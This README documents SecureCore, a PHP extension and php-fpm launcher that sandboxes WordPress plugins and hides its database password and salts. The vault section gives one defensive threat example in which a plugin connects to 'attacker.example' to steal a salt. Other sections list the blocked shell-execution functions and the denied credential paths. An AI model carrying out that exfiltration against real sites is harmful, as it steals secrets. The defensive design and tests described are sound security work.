# SecureCore PHP extension

SecureCore as one PHP extension written in Rust ([ext-php-rs](https://crates.io/crates/ext-php-rs)),
configured from one file, `securecore.json` (addiscorp/securecore#53). Phases so far: **E1** loads,
validates and reloads the config and reports it; **E2a** works out which component is running;
**E2b** enforces layer 2's file and process rules; **E3** is the [vault](#vault-e3), which keeps
the DB password and the WordPress keys and salts out of PHP's reach; **E6** is layer 1, the
`securecore-fpm` launcher ([Layer 1](#layer-1-securecore-fpm-e6)). Still to come: the database and
hostname policy (E4–E5) and layer 3 (E7).

| crate | what |
|---|---|
| `config/` (`securecore-config`) | the config types (serde), the loader, the reloader and the JSON Schema; and the vault's pure logic (E3): reading a secret's source ([`source`](config/src/source.rs)) and the salt reconstruction + keyed hashing ([`salt`](config/src/salt.rs)). Plain Rust, no PHP: the `securecore-fpm` launcher (E6) reads the file with the same code, and the extension and the host tests share the vault's bytes. |
| `attribution/` (`securecore-attribution`) | E2a: path → component (plugin, mu-plugin, theme, core), the two "who is running" rules, the watched file functions, `securecore-attribution-report`; and E2b: the file/process [`policy`](attribution/src/policy.rs). Plain Rust, no PHP. |
| `php/` (`securecore-php`) | the extension, built as `securecore.so` |
| `fpm/` (`securecore-fpm`) | E6: layer 1, the launcher that starts php-fpm inside [gelada](https://crates.io/crates/gelada) 0.3.0. Plain Rust, no PHP. |

## Build

The extension builds against PHP's headers, in Docker (PHP 8.3 NTS, Debian bookworm). From the
repo root:

```sh
docker build -f docker/ext.Dockerfile --target so -o .tmp/ext .   # → .tmp/ext/securecore.so
docker build -f docker/ext.Dockerfile --target check .            # clippy -D warnings + cargo test, whole workspace
docker build -f docker/ext.Dockerfile --target php-layer1 .       # WordPress php-fpm started by securecore-fpm
```

The config crate alone needs no PHP: `cargo test` in `ext/` runs its tests (the workspace's
default member).

## Install

Copy `securecore.so` into PHP's extension folder and add one ini file to `conf.d`
(`docker/securecore.ini`):

```ini
extension=securecore.so
securecore.config=/var/www/html/securecore.json
```

**The app root is the folder containing `securecore.json`** (as with `composer.json`): every
relative path in the file is relative to it, and absolute paths are used as they are. So the
file usually sits at the web root, and **the web server must never serve it**: the docker nginx
config answers 404 for any URI containing `securecore.json` (copies such as `.bak` included);
an installer that writes the file must do the same for its server.

`securecore.config` is `PHP_INI_SYSTEM`: set it in php.ini or `conf.d`, not in a php-fpm pool
(`php_admin_value`), because the file is loaded once when PHP starts, before pools exist.

**Fail closed.** With the extension loaded, a config that is not set, missing, unreadable or
invalid stops PHP from starting: module startup fails, PHP logs

```
PHP Warning:  PHP Startup: securecore: /var/www/html/securecore.json: invalid: unknown variant `block`, expected one of `enforce`, `log`, `off` at line 1 column 85; refusing to start in Unknown on line 0
PHP Fatal error:  Unable to start securecore module in Unknown on line 0
```

to php-fpm's error log (stderr under Docker or systemd) and exits; `php-fpm -t` and the PHP CLI
refuse the same way. There is no fallback to running unprotected. A config with all three
layers disabled (`examples/off.json`) is valid and means SecureCore is off.

## Config

`securecore.json` has three objects, `layer1`, `layer2` and `layer3`, and an optional
`"$schema"`. Every object rejects unknown keys. The reference is
[`securecore.schema.json`](securecore.schema.json), generated from the Rust types (the doc
comments on them are its descriptions), so the schema and the parser can't disagree; the
`schema_in_sync` test fails if the committed file is stale. Regenerate it in `ext/` with:

```sh
cargo run -p securecore-config --bin securecore-schema > securecore.schema.json
```

Examples: [`examples/wordpress.json`](examples/wordpress.json) (every field, the #53 example) and
[`examples/off.json`](examples/off.json) (the minimum: three `{"enabled": false}`).

Beyond the schema's structure, one rule is checked in code and expressed in the schema as an
`if`/`then`: `layer2.app` is required when layer 2 is enabled. `layer2.mode` defaults to
`enforce`. The parser accepts exactly what the schema accepts: serde would also read any object
from a JSON array (its fields by position), and that form is rejected
(`layer1 is an array; it must be an object`).

Each entry in `layer2.default` and `layer2.components.<slug>` sets a component's rules; a field
left out of an entry inherits from `default`. For E2b those fields are `files` — an object with
`read` (extra readable paths outside the root) and `write` (extra writable paths, on top of
uploads and cache) — and `exec` (a bool: may the component run programs). See
[Enforcement (E2b)](#enforcement-e2b) for what each means. (`hosts`, `tables`, `options` and
`grants` are for later phases.)

## Reload

Layers 2 and 3 follow the file without a php-fpm restart. At request start (RINIT) each php-fpm
worker `stat`s the file at most once per second (`RELOAD_INTERVAL`), and reads, hashes and
parses it only when the stat (inode, size, mtime, ctime) changed. A new valid file goes live in
that worker and is logged (`securecore: reloaded <path> (sha256 …)`). So an edit is live
everywhere about a second after it is saved; the cost on a request with no change is one clock
read, and one `stat` a second per worker.

- An edit that does not load (invalid, unreadable, deleted) keeps the **last valid config** live,
  never off, and is logged once per distinct problem:
  `securecore: <path>: invalid: …; keeping the last valid config`. A restart then refuses to
  start until the file is fixed.
- `layer1` is read by the launcher at start. If it changes, the extension logs
  `layer1 changed; it applies only after a php-fpm restart` and reports `restart_needed`.
- `layer2.vault` is read at MINIT too (the real secret values are taken once, before php-fpm
  forks). A change to it logs `layer2.vault changed; it applies only after a php-fpm restart` and
  reports `restart_needed`, like `layer1`. Everything else in layer 2 still reloads live.

## Vault (E3)

The DB password and the WordPress keys and salts never exist as a value PHP can read. The real
values live only in the extension's own memory; everywhere PHP could look — the constant, the
environment, `$_ENV`, `$_SERVER`, `getenv()`, `phpinfo()`, a `var_dump`/`serialize`/reflection of
`$wpdb` — carries a **placeholder**, `securecore-vault:<NAME>` (unique per secret). The extension
puts the real value back only at the two points where it is used: inside the database `connect`
call, and inside the native `wp_salt`/`wp_hash` the mu-plugin installs.

```json
"vault": {
  "from": { "vaultFile": "/etc/securecore/vault.json" },
  "secrets": [
    { "name": "DB_PASSWORD", "env": "WORDPRESS_DB_PASSWORD" },
    "AUTH_KEY", "SECURE_AUTH_KEY", "LOGGED_IN_KEY", "NONCE_KEY",
    "AUTH_SALT", "SECURE_AUTH_SALT", "LOGGED_IN_SALT", "NONCE_SALT"
  ]
}
```

Each entry in `secrets` is a **constant name** (`"AUTH_KEY"`) or an object
`{ "name": "DB_PASSWORD", "env": "WORDPRESS_DB_PASSWORD" }`. With `env`, the real value is read
from that environment variable of the php-fpm master. A bare name takes its value from `from`.
Nothing implicit decides where a secret comes from: a bare name with no `from` is refused.

`from` is one of:
- `{ "vaultFile": "<path>" }` — **the recommended source.** A vault file is a JSON object of
  `"NAME": "value"` strings, kept **outside the docroot**, owned by the user that starts php-fpm
  (root) and readable by it alone (`chmod 400`). php-fpm's master reads it once at MINIT, before
  it drops to `www-data`; the workers cannot open it at all, and the secret never appears in any
  PHP file.
  ```json
  { "AUTH_KEY": "…", "AUTH_SALT": "…", "NONCE_SALT": "…" }
  ```
- `{ "wpConfig": "<path>" }` — read the `define()` values of a wp-config.php natively. Safe only
  for the usual `define('NAME', getenv('NAME'))` form (an expression). **A secret written as a
  bare string literal** in wp-config.php (`define('NAME', 'secret')`) **is not hidden** — see the
  opcache note below. When `from` is set its file is also [protected](#enforcement-e2b): no PHP
  code may read or write it.

Setting `from` also protects that file; `env` secrets need no file.

`dbHost` (optional): the database host the DB password may ever be sent to (see **Point of use**).
Normally left unset — the extension reads WordPress's `DB_HOST` constant, the way WordPress does.
Set it only where there is no such constant to read; a host is never guessed, so an unknown host
means the swap is refused.

### How it works

- **At MINIT**, in the fpm master before it forks: read every real value (from its `env` variable
  or from `from`) and keep it in extension memory. Then overwrite each mapped environment variable
  in the C `environ` with the secret's placeholder, so the workers inherit a masked environment.
- **Backstop sweep at MINIT:** also mask every `environ` entry whose value equals any secret's
  value, whatever its name (so a copy under another name can't leak it). Only the names masked are
  logged — `securecore: vault: masked N environment variable(s): …` — never a value.
- **Fail closed:** a secret that is missing or empty, or a mapped variable that isn't set, refuses
  MINIT, exactly as a bad config does. php-fpm never serves a request with a half-loaded vault.
- **Per request / per call:** `getenv()` is overridden (through the E2b handler lever) to return
  the placeholder for any value that matches a secret; `define()` of a secret name is forced to
  the placeholder; and `$_ENV`/`$_SERVER` carry only placeholders because php-fpm builds them from
  the masked `environ`.
- **Point of use:** `mysqli_connect`, `mysqli_real_connect`, `mysqli::real_connect`, `new mysqli`
  and `new PDO` restore the real DB password in the call frame, before the engine's own function
  runs — so the real value reaches libmysql/PDO and never a PHP zval the caller keeps. The real
  value is about to leave the process, so the swap happens **only when all three hold**, and is
  refused (and recorded) otherwise — in `log` mode too, because leaking a secret is never "log and
  allow":
  - **the DB password only** — never a salt. The DB password is the single secret restored at a
    connect boundary; a salt placeholder handed to a connect as the password is refused, not
    swapped (otherwise a component could read `new mysqli('attacker.example', 'x',
    SECURE_AUTH_KEY_placeholder)` and collect the salt).
  - **the caller is core** — by E2a's `frame` attribution (the innermost user-code frame that
    makes the call), so WordPress's `wpdb` counts and a plugin's own `new mysqli` does not.
  - **the host is the configured DB host** — `layer2.vault.dbHost`, or the `DB_HOST` constant —
    compared after normalising the `p:` prefix, a `:port` and a socket path
    ([`config/src/dbhost.rs`](config/src/dbhost.rs)). A component pointing a connect at its own
    server never matches, so the password is not sent there even over a cleartext or
    RSA-under-attacker-key auth exchange.
- **Salts:** the mu-plugin `securecore-vault.php` (installed in `wp-content/mu-plugins`, so it
  loads before `pluggable.php`) defines `wp_salt()` and `wp_hash()` over the extension's native
  `securecore_vault_salt`/`securecore_vault_hash`. `wp_hash()` computes `hash_hmac($algo, $data,
  wp_salt($scheme))` over the **real** keys inside the extension — byte-identical to stock
  WordPress for the standard key/salt constants — so the HMAC key never becomes a PHP value, while
  login cookies, nonces and password-reset keys keep working. `wp_salt()` returns a scheme token,
  never the key, so a probe that calls it cannot recover the key. The reconstruction and hashing
  are one plain-Rust function ([`config/src/salt.rs`](config/src/salt.rs)), shared by the extension
  and the host tests.

The vault is **not a policy**: it works in `log` mode exactly as in `enforce` (it is where the
value lives, not what is allowed), and with no `vault` in the config it does nothing.

### The opcache finding

opcache's optimizer rewrites `define('NAME', <scalar literal>)` into a compile-time
`DECLARE_CONST` opcode, and keeps the literal string as an operand of the cached op_array in
opcache's shared memory. Two consequences, both measured on the stack:

- **PHP cannot read the cached literal directly:** `opcache_get_status()` and
  `opcache_get_configuration()` expose only metadata, not op_array operands, and there is no
  userland API that does.
- **But a literal `define()` bypasses the extension's interception:** because the `define()` call
  is gone, the `DECLARE_CONST` declares the constant to the **real literal**, which any PHP code
  then reads as the constant. (Verified: with the optimizer on, a literal `define` yields the real
  value; with it off, the extension's handler masks it.) The plaintext also sits in shared memory
  for the life of the process.

So a secret written as a bare literal in wp-config.php cannot be hidden by the engine. **This
fails closed:** at MINIT, if `from` is `wpConfig` and any secret is a bare name (so it is read as
a string literal) while opcache is loaded, the extension refuses to start, naming the secret:

```
PHP Warning:  PHP Startup: securecore: layer2.vault: DB_PASSWORD is a string literal in
wp-config.php and opcache inlines it (DECLARE_CONST), so the vault cannot hide it; move it to a
vault file (from.vaultFile) or an environment variable (secrets[].env); refusing to start
```

(opcache's own ini values are not yet applied when this module starts, so the optimizer level
can't be read there; a standard build turns the optimizer on, so the check treats a literal as
un-hideable whenever opcache is loaded. With no opcache at all, a literal `define()` stays a real
call the extension masks.) The **vault file is the answer**: the secret lives in a root-only file
outside the docroot, never enters a PHP file, and so never becomes a constant literal or an opcache
operand. Expression defines (`define('NAME', getenv('NAME'))`, the Docker image's and the standard
managed-WordPress form) are not literals, so env-mapped secrets and the vault file are unaffected.

## `securecore_status(): array`

What this worker is enforcing:

```php
[
  'version' => '0.1.0',
  'config' => '/var/www/html/securecore.json',
  'sha256' => '6e5d42ec…',          // of the file's bytes
  'off' => false,                   // all three layers disabled
  'layers' => ['layer1' => true, 'layer2' => true, 'layer3' => true],
  'layer2_mode' => 'enforce',       // enforce | log | off
  'layer2_app' => 'wordpress',      // or null
  'vault' => true,                  // the vault is loaded in this process (E3)
  'vault_secrets' => 9,             // how many secrets it holds (never the values)
  'reloads' => 0,                   // reloads in this worker since it forked
  'restart_needed' => false,        // layer1 or the vault differs from the one php-fpm started with
  'reload_error' => null,           // the problem with the file on disk, while it can't load
  'root' => '/var/www/html',        // the folder containing securecore.json
  'caller' => 'core',               // who called, by the attribution rule (below)
  'attribution_rule' => 'component',
  'attribution_log' => 'off',
]
```

`phpinfo()` shows the config path and sha256 too.

Since E2b, `securecore_status()` is **callable from core only**. A component that calls it is
refused in `enforce` mode (a thrown exception) and recorded but allowed in `log` mode, like any
other layer-2 operation.

## Attribution (E2a)

Layer 2 restricts each **component**. For `layer2.app = "wordpress"` (`attribution/`):

- each folder in the plugins directory, or `.php` file directly in it, is `plugin:<slug>`;
- each entry in mu-plugins is `mu-plugin:<name>`, except SecureCore's own loader
  (`securecore-loader.php`), which is core;
- each folder in the themes directory is `theme:<slug>`;
- everything else under the root (and in `WP_CONTENT_DIR`) is `core`; anything else is
  `outside`. `index.php` in those directories is core.

`WP_CONTENT_DIR`, `WP_PLUGIN_DIR` and `WPMU_PLUGIN_DIR` move the directories when defined
(read when asked, so they count once wp-config.php has set them). Symlinks are resolved: a plugin
symlinked in from elsewhere is still itself when PHP reports its files by their real path. The
map re-reads the component directories when their mtime changes (checked at most once a
second).

**Who is running** is computed only when asked, from the PHP stack (`execute_data`), by one of
two rules:

| rule | the component responsible is | a plugin calling a core API that opens a file |
|---|---|---|
| `frame` (a) | the innermost user-code frame's file | core |
| `component` (b) | the innermost frame on the stack that belongs to a component; core only when none is | the plugin |

Two debug settings, both PHP_INI_SYSTEM, choose and expose it:

```ini
securecore.debug_attribution_rule = component   ; frame | component (the default)
securecore.debug_attribution_log  = off         ; off (default) | frame | component | both
```

With logging on and layer 2 in `log` or `enforce` mode, every file open writes one line per
logged rule to PHP's error log:

```
securecore: attribution component plugin:contact-form-7 file_get_contents /var/www/html/wp-content/uploads/x.txt
securecore: attribution frame core require_once /var/www/html/wp-includes/version.php
```

"Opens" are every include/require that loads a file (through a `zend_compile_file` wrapper, so
opcache hits count), and the PHP functions that open a path through the plain-files wrapper
(`attribution/src/watch.rs`: fopen with its mode, file_get_contents, file_put_contents, file,
readfile, opendir/scandir/glob, unlink/rename/copy/mkdir/… and SplFileObject), through a Zend
observer. Not seen: opens made inside other extensions' C code (GD, Zip, …) and metadata calls
(`file_exists`, `stat`). With logging off neither hook exists, so the normal request path pays
nothing. This is observation only: nothing is blocked.

`research/attribution/measure.sh` runs the measurement on the docker stack and
`securecore-attribution-report` turns the log into per-component tables.

## Enforcement (E2b)

Layer 2 enforces a file and process policy on each **component** (plugin, mu-plugin or theme),
by the `component` attribution rule — the one #55's measurement recommended, which charges the
caller. **Core is never restricted.** The rules (in [`attribution/src/policy.rs`](attribution/src/policy.rs),
plain Rust, unit-tested):

- **read:** anywhere under the app root, except the two protected files — the vault's `from`
  file (e.g. `wp-config.php`) and `securecore.json`. Outside the root, only what the component's
  `files.read` lists. (Reads under the root are open because shared libraries and core APIs
  routinely read another component's files on its behalf; the secrets are what stay closed.)
- **write** (create, modify, delete, rename, mkdir): the uploads and cache folders, plus what
  `files.write` lists. Never a protected file — not even its own folder.
- **exec** (exec, shell_exec, system, passthru, popen, proc_open, pcntl_exec, and mail when it
  shells out): refused unless the component's `exec` is `true`.

`mode` decides what a refusal does: `enforce` blocks it and the call fails as PHP fails on a
permission error (a warning, and `false`; a denied include stops as a missing file would —
a warning for `include`, a fatal for `require`); `log` writes one line and lets it through;
`off` does neither. A refusal line is

```
securecore: layer2 enforce plugin:acme open   write /var/www/html/wp-includes/x.php
securecore: layer2 log     plugin:acme exec   exec  /usr/bin/convert input.png
```

**Where the checks sit.** Every open of a plain path goes through a stream wrapper for its
scheme, and a bare path (nearly all real paths) resolves `"file"`. `php_stream_locate_url_wrapper`
looks `"file"` up in the per-request table `FG(stream_wrappers)` when it is set — which is how
userland `stream_wrapper_unregister('file')` replaces it. So at each request (once layer 2 is
active) the extension registers a volatile C `file` wrapper whose ops check the policy and
delegate to the built-in plain-files wrapper's ops. That is the single checkpoint for every open
through PHP streams — `fopen`, `file_get_contents`, `SplFileObject`, GD by filename, `error_log`
type 3, libxml, metadata (`touch`/`chmod`/`chown` via `stream_metadata`), and more. Opcache-cached
includes skip the open, so the `zend_compile_file` wrapper (shared with E2a) still covers include
and require. Paths are resolved through PHP's realpath cache before the decision, so a symlink
under the root cannot smuggle an open past the prefix tests, and the protected files are matched
by (device, inode), so a hard link to one is caught too. That per-open inode stat is the one
non-trivial cost on the open path, so it runs only while it can matter: each request stats the
protected files once and skips it entirely unless one has more than one link (a hard link to a
protected file cannot exist otherwise, and a component cannot create one — `link()` is refused). A
file or folder about to be *created* has no realpath, so the decision is made on its deepest
existing ancestor (symlinks in it followed) with the rest appended, and a dangling symlink at the
first new component is followed to its target — the path a write or a recursive `mkdir` actually
lands on, not the lexical path (so `symlink('../other/x', uploads/link)` then writing
`uploads/link`, and `mkdir(uploads/link/a/b)` through a symlinked ancestor, are both decided on
`other/…`). A chain of not-yet-existing symlinks is followed up to eight hops; a path that runs
past that, or that has no existing ancestor at all, is refused as `unresolvable` rather than
decided on its lexical form.

Function handlers cover only what does **not** go through a stream wrapper: the process functions;
`symlink`/`link` (handled in `ext/standard/link.c`). `link` is refused when its target is a
protected file; `symlink` is refused unless its target — resolved relative to the link's own
directory — is itself writable, so a link may point only where the component could already write.
And `stream_wrapper_register`/`unregister`/`restore` of `"file"`, which a component could otherwise
use to undo the override.

**Covered** (each fails as PHP would on a permission error): everything that opens through PHP
streams, listed above, plus `include`/`require`(`_once`) and the process functions, plus `symlink`
and `link`. **Not covered** (documented gaps, not silently missed): opens made inside another
extension's C code that call `open(2)` directly rather than through PHP streams (libzip's archive
I/O), and read-only metadata (`file_exists`, `stat`, `is_dir` — not opens). One residual, by
design: an `include` of a path under the plugins/mu-plugins/themes directories skips the per-open
inode stat (the include hot path), so a *pre-existing* hard link to a protected file placed inside
a code directory and then included is not caught by inode — only by path. A component cannot make
such a link (`link()` is refused), so this needs a link placed out-of-band; every other op, and an
include resolving anywhere else, still gets the inode check. Layer 1 (the kernel) backstops a
component that reaches a file by a path the engine's streams never see.

`research/enforce/compat.sh` runs Classic Editor, Yoast SEO and Contact Form 7 in enforce mode
and lists every refusal; `bench/enforce.sh` is the front-page benchmark.

## Layer 1: `securecore-fpm` (E6)

Layer 1 protects the server from the whole site, core included: php-fpm can write only the
listed folders, can't read the denied paths, and has TCP on the listed ports and nothing else.
It is the kernel's doing (Landlock + seccomp, through [gelada](https://crates.io/crates/gelada)
0.3.0), so it holds for native code, for any PHP app, and for every program php-fpm starts.

```sh
securecore-fpm --config /var/www/html/securecore.json [--php-fpm <program>] [--] [php-fpm args...]
```

It reads the file with the same loader and types as the extension (`config/`), applies
`layer1` to itself as a gelada sandbox (`restrict_self`) and then execs php-fpm (`php-fpm` on
`PATH`, or `--php-fpm`) with the remaining arguments, so the master and every worker it forks
run inside it. It logs one line to stderr first:

```
securecore-fpm: layer 1 on from /var/www/html/securecore.json (sha256 2ad59919…): write /var/www/html/wp-content/uploads /var/www/html/wp-content/cache /tmp; deny /srv/backups; tcp bind 9000; tcp connect 53 3306 443; starting php-fpm
```

With `layer1.enabled: false` it execs php-fpm as it is and says so (`layer 1 is off in …`).
A change to `layer1` applies at the next php-fpm (launcher) restart; the extension flags it as
`restart_needed`.

**Fail closed.** The launcher exits **125** (gelada's convention for its own failures) with the
reason on stderr, and php-fpm never starts, when the file is missing, unreadable or invalid,
when `layer1` can't be enforced as written, or when the kernel won't apply the sandbox (no
Landlock, or TCP port rules on a kernel without Landlock ABI 4, Linux 6.7):

```
securecore-fpm: /var/www/html/securecore.json: invalid: invalid value: integer `0`, expected a nonzero u16 at line 7 column 29; refusing to start php-fpm
securecore-fpm: /var/www/html/securecore.json: layer1.network.unixSockets (/run/mysqld/mysqld.sock) can't be combined with TCP ports (layer1.network.bind/connect) yet: gelada 0.3.0 refuses a unix-socket allowlist together with port rules on Linux (addiscorp/securecore#57). Reach the service over its TCP port instead (MySQL: 3306) and remove unixSockets; refusing to start php-fpm
```

**`unixSockets` is refused for now**, never dropped: with TCP ports, gelada 0.3.0 can't also
allow unix sockets on Linux (#57); without ports, the allowlist needs gelada's supervisor in a
separate process, which `restrict_self` refuses. So layer 1 reaches MySQL over TCP 3306, and
php-fpm must listen on TCP (`listen = 9000`): with port rules no unix socket can be made, so a
`listen = /run/php/php-fpm.sock` pool (the Debian package's default) can't start.

Linux only: on macOS gelada can sandbox a program only as it starts, so `restrict_self` fails
and the launcher exits 125.

### What php-fpm needs, and the example

Everything php-fpm may do is in the file; the launcher adds nothing. `examples/wordpress.json`'s
`layer1` is what a WordPress php-fpm needs (measured on the docker stack, `test/ext-layer1.sh`):

| entry | why |
|---|---|
| `bind` 9000 | the pool's `listen = 9000`; the master binds it before it forks the workers |
| `connect` 3306 | MySQL over TCP (not its socket, above) |
| `connect` 443 | HTTPS out: WordPress.org updates, plugins' APIs. Port, not host: the hostnames are layer 2's (E5) |
| `connect` 53 | DNS over TCP. Port rules leave no UDP, so the resolver must use TCP: `options use-vc` in `/etc/resolv.conf` (Docker: `dns_opt: [use-vc]`, as `docker/compose.ext-layer1.yml` does) or `RES_OPTIONS=use-vc`. Without it every name lookup (the `db` host too) fails |
| `write` `wp-content/uploads` | media uploads |
| `write` `wp-content/cache` | page caches |
| `write` `/tmp` | PHP's temporary folder: file uploads (without it `$_FILES` gets `UPLOAD_ERR_NO_TMP_DIR`), file sessions (`session.save_path` is empty, so `/tmp`: `session_start()` fails), and `sys_get_temp_dir()` users such as WordPress's `download_url()` for updates. Point `upload_tmp_dir`, `session.save_path` and `sys_temp_dir` elsewhere to list that folder instead |
| `deny` `/srv/backups` | an example of a path to hide: database dumps |

What php-fpm needs **no** rule for, checked on the stack: its logs (the image's
`error_log = /proc/self/fd/2` is a pipe, which Landlock doesn't restrict; a log *file* would
need its folder in `write`), the master dropping to `www-data` (setuid works inside the
sandbox, and the workers inherit it: every php-fpm process shows `NoNewPrivs: 1` and gelada's
two seccomp filters), and opcache's shared memory (anonymous; no lock file). With a `pid` file
or a log file configured in php-fpm, add their folders to `write`. WordPress's own loopback
requests (wp-cron's spawn, Site Health) go to the site's own port: add it to `connect` (443 is
already there; 80 for an HTTP site). Updating core or plugins in place needs their folders in
`write`; layer 1 leaving them read-only is the point.

Implicit, because gelada always does it and it is not SecureCore's to choose: gelada denies its
common secrets under the launcher's `HOME` (`~/.ssh`, `~/.aws`, `~/.config/gcloud`, …), lets the
devices programs write by path be written (`/dev/null`, `/dev/zero`, `/dev/full`, `/dev/tty`,
`/dev/ptmx`, `/dev/pts`, `/dev/shm`), and makes an empty temporary folder of its own writable
(`$TMPDIR/gelada-<pid>-<n>`, left behind since the launcher execs). A `write` folder that doesn't
exist is created by gelada as the launcher's user (root): create it beforehand, owned by the
pool user, if php-fpm must write it. The environment is passed to php-fpm as it is (the Docker
WordPress image's `wp-config.php` reads the database password from it).

Known: a graceful stop (`SIGQUIT`, Docker's stop signal for this image) logs `WARNING: failed to
create a new socket` once per worker. php-fpm's soft-quit handler opens a placeholder unix
socket in place of the closed listening socket, and the port rules refuse it; the worker still
finishes its request and exits.

### Docker

`docker/ext.Dockerfile`'s `php-layer1` target is the `php` target with `securecore-fpm` as the
command (`securecore-fpm --config /var/www/html/securecore.json`) and `docker-ensure-installed.sh`
as the entrypoint, so a new site volume still gets WordPress copied in.
`docker/compose.ext-layer1.yml` runs it on top of `compose.ext.yml` and sets `dns_opt: [use-vc]`.
No `--security-opt` is needed: Docker's default seccomp profile allows Landlock and seccomp, and
gelada stacks its filters on top of it.

## Tests

- `cargo test` (in Docker: the `check` target): the examples parse, unknown keys and bad
  values are rejected at every level, the schema is in sync, and the reloader follows the file,
  keeps the last valid config on a bad edit and flags layer 1 changes. On Linux, `fpm/tests/`
  runs the built launcher with bash standing in for php-fpm: an invalid file and unixSockets +
  ports exit 125 without running it, layer 1 off runs it as it is, and layer 1 on refuses a
  write outside the folders (from a child too), a denied read, another TCP port and UDP, with
  the same script getting through each with layer 1 off.
- `DOCKER_CONTEXT=colima test/ext-layer1.sh`: WordPress with php-fpm started by securecore-fpm
  (`docker/compose.ext-layer1.yml`, project `securecore-layer1`, port 8090), the three plugins
  active, layer 2 off and then in enforce mode: front page 200, every php-fpm process sandboxed,
  the DB on 3306 and 443 work, ports 25 and 80, a bind of 8081, UDP and a unix socket are
  refused (and the listeners outside the sandbox receive nothing), writes outside the folders
  are refused from core and from a child program, the denied path is unreadable; unixSockets +
  ports and an invalid file exit 125 at launch with php-fpm never starting.
- All the `test/ext-*.sh` scripts take `SECURECORE_EXT_PROJECT` and `SECURECORE_EXT_PORT` to run
  as another compose project on another port.
- `DOCKER_CONTEXT=colima test/ext-config.sh`: WordPress on the docker stack with the extension
  (`docker/compose.ext.yml`, project `securecore-ext`, port 8089): front page 200, the status
  reports the file's sha256 and layers, an edit is live in every worker without a restart, and
  an invalid, missing or unset config makes php-fpm refuse to start with the reason in its log.
- `DOCKER_CONTEXT=colima test/ext-attribution.sh` (after ext-config.sh): fixture plugins open
  files in known ways; checks the component each rule charges, the map (own includes, a
  mu-plugin callback, a symlinked plugin, core including plugins and the theme), the rule
  setting, that logging is off by default and that mode `off` records nothing.
- `DOCKER_CONTEXT=colima test/ext-enforce.sh` (after ext-config.sh): a probe plugin attempts
  each file and process operation; checks that enforce mode blocks the forbidden ones (and the
  refusals are logged), that log mode lets the same ones through (the revert proof), that layer 2
  off records nothing, and that a granted component gets its grants while the protected file and
  `securecore_status()` stay refused.
- `DOCKER_CONTEXT=colima test/ext-vault.sh` (after ext-config.sh): a probe plugin and a core
  probe try every route to the DB password and the salts (getenv, `$_ENV`, `$_SERVER`, phpinfo,
  the constants, `$wpdb` dumped, `wp_salt`/`wp_hash`, the vault file and wp-config, reflection,
  serialize, debug_backtrace and the error log) and must see only placeholders, in enforce and in
  log mode; the DB connects and nonces, auth cookies and password reset round-trip; `wp_hash` is
  byte-identical to a known-salt HMAC; the backstop masks the salt env vars (names only). It also
  drives the connect boundary: a probe connects to a fake MySQL server that forces clear-text auth,
  and the captured bytes must never carry the real password or a salt — the swap is refused for a
  plugin, for a foreign host and for a salt placeholder (enforce and log), while core still
  connects. And it checks the opcache fail-closed refusal (a literal `wpConfig` secret stops
  php-fpm) and the revert proof — with the vault gone from the config, and with the extension
  unloaded, the probe does see the secret — plus Classic Editor, Yoast and CF7 front/login 200.
- `DOCKER_CONTEXT=colima bench/vault.sh` (after ext-config.sh): front-page p50 and a login round,
  7 rounds, with the vault on vs a no-vault config.
- `DOCKER_CONTEXT=colima bench/ext.sh`: front-page p50 with the extension loaded vs not.
- `DOCKER_CONTEXT=colima bench/attribution.sh`: front-page p50 not loaded, loaded with
  attribution logging off, and on.
- `DOCKER_CONTEXT=colima bench/enforce.sh`: front-page p50 with the three plugins, not loaded vs
  loaded in enforce mode.
- `DOCKER_CONTEXT=colima bench/layer1.sh` (after ext-layer1.sh): front-page p50 with the three
  plugins and the extension unloaded, layer 1 off (stock php-fpm) vs on.
